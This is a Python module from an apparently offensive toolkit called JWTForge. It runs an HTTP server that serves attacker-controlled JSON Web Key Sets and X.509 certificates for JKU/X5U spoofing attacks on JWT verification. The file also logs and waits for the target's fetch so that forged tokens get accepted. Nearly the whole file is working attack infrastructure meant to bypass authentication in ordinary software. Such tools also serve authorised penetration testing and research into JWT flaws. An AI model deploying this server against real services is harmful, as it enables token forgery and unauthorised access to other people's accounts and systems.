"""
JWTForge - JWKS / Certificate Server

Hosts attacker-controlled JWKS and certificates for JKU/X5U attacks.
Starts a simple HTTP server with routes for:
  - GET /.well-known/jwks.json   → JWKS (for JKU attacks)
  - GET /cert.pem                → X.509 certificate (for X5U attacks)
  - GET /                        → Status page
"""

import json
import threading
import time
from http.server import HTTPServer, BaseHTTPRequestHandler
from typing import Optional, Dict, Any
from urllib.parse import urlparse


class JWKSRequestHandler(BaseHTTPRequestHandler):
    """HTTP handler serving JWKS and certificate endpoints."""

    jwks_json: str = json.dumps({'keys': []})
    cert_pem: str = ''
    request_log: list = []

    def log_message(self, format, *args):
        """Override to use our own logging."""
        msg = format % args
        JWKSRequestHandler.request_log.append({
            'time': time.strftime('%H:%M:%S'),
            'client': self.client_address[0],
            'path': getattr(self, 'path', '?'),
            'msg': msg,
        })
        print(f"\n  [bold cyan][JWKS Server][/bold cyan] {self.client_address[0]} → {getattr(self, 'path', '?')}")

    def do_GET(self):
        parsed = urlparse(self.path)
        path = parsed.path

        # Track incoming requests
        hit = {
            'time': time.strftime('%H:%M:%S'),
            'client': self.client_address[0],
            'path': path,
            'headers': dict(self.headers),
        }
        JWKSRequestHandler.request_log.append(hit)

        if path in ('/.well-known/jwks.json', '/jwks.json', '/jwks'):
            self._serve_jwks()
        elif path in ('/cert.pem', '/cert', '/certificate.pem'):
            self._serve_cert()
        elif path == '/':
            self._serve_status()
        else:
            self._serve_404()

    def _serve_jwks(self):
        body = JWKSRequestHandler.jwks_json.encode()
        self.send_response(200)
        self.send_header('Content-Type', 'application/json')
        self.send_header('Content-Length', str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def _serve_cert(self):
        if not JWKSRequestHandler.cert_pem:
            self._serve_404()
            return
        body = JWKSRequestHandler.cert_pem.encode()
        self.send_response(200)
        self.send_header('Content-Type', 'application/x-pem-file')
        self.send_header('Content-Length', str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def _serve_status(self):
        body = (
            '<html><body>'
            '<h1>JWTForge JWKS Server</h1>'
            '<ul>'
            '<li><a href="/.well-known/jwks.json">/.well-known/jwks.json</a> — JWKS endpoint</li>'
            '<li><a href="/cert.pem">/cert.pem</a> — X.509 Certificate</li>'
            '</ul>'
            f'<p>Requests served: {len(JWKSRequestHandler.request_log)}</p>'
            '</body></html>'
        ).encode()
        self.send_response(200)
        self.send_header('Content-Type', 'text/html')
        self.send_header('Content-Length', str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def _serve_404(self):
        body = b'Not Found'
        self.send_response(404)
        self.send_header('Content-Length', str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def log_request(self, code='-', size='-'):
        pass  # Suppress default access log


class JWKSServer:
    """
    Attacker-controlled JWKS server for JKU/X5U spoofing attacks.

    Usage:
        server = JWKSServer(host='0.0.0.0', port=8888)
        server.set_jwks(jwks_dict)
        server.set_cert(cert_pem_string)
        server.start()  # non-blocking
        # ... wait for target to hit us ...
        server.stop()
    """

    def __init__(self, host: str = '0.0.0.0', port: int = 8888):
        self.host = host
        self.port = port
        self._server: Optional[HTTPServer] = None
        self._thread: Optional[threading.Thread] = None
        JWKSRequestHandler.request_log = []

    def set_jwks(self, jwks: Dict):
        """Set the JWKS content to serve."""
        JWKSRequestHandler.jwks_json = json.dumps(jwks, indent=2)

    def set_jwks_json(self, jwks_json: str):
        """Set the JWKS content as raw JSON string."""
        JWKSRequestHandler.jwks_json = jwks_json

    def set_cert(self, cert_pem: str):
        """Set the X.509 certificate PEM to serve."""
        JWKSRequestHandler.cert_pem = cert_pem

    def start(self, blocking: bool = False):
        """Start the server. If blocking=False, runs in background thread."""
        self._server = HTTPServer((self.host, self.port), JWKSRequestHandler)

        if blocking:
            self._server.serve_forever()
        else:
            self._thread = threading.Thread(target=self._server.serve_forever, daemon=True)
            self._thread.start()

    def stop(self):
        """Stop the server."""
        if self._server:
            self._server.shutdown()
            self._server = None
        if self._thread:
            self._thread.join(timeout=2)
            self._thread = None

    def get_request_log(self) -> list:
        """Return list of requests received."""
        return JWKSRequestHandler.request_log.copy()

    def wait_for_hit(self, path: str = None, timeout: int = 60) -> Optional[Dict]:
        """
        Block until an HTTP request is received (optionally matching path).
        Returns the request dict or None on timeout.
        """
        start = time.time()
        seen = len(JWKSRequestHandler.request_log)

        while time.time() - start < timeout:
            log = JWKSRequestHandler.request_log
            if len(log) > seen:
                for req in log[seen:]:
                    if path is None or req.get('path') == path:
                        return req
                seen = len(log)
            time.sleep(0.1)

        return None

    @property
    def url(self) -> str:
        return f"http://{self.host}:{self.port}"

    @property
    def jwks_url(self) -> str:
        return f"{self.url}/.well-known/jwks.json"

    @property
    def cert_url(self) -> str:
        return f"{self.url}/cert.pem"
